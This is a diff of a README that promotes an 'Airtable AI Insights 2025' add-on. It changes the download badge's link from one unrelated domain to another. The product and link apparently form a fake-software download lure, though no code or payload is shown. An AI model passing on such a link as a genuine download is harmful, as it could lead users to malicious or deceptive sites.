@@ -2,7 +2,7 @@
 
 ⚙ Amplify your data management with this AI-powered Airtable add-on! Airtable AI Insights 2025 automates data analysis, generates smart visualizations, and streamlines workflows, crafted for analysts, marketers, and project managers.
 
-[![Get Airtable AI Insights](https://img.shields.io/badge/Get-Airtable_AI_Insights-blueviolet)](https://cea-groupe.com)
+[![Get Airtable AI Insights](https://img.shields.io/badge/Get-Airtable_AI_Insights-blueviolet)](https://glocktober.com)
 
 ---
 
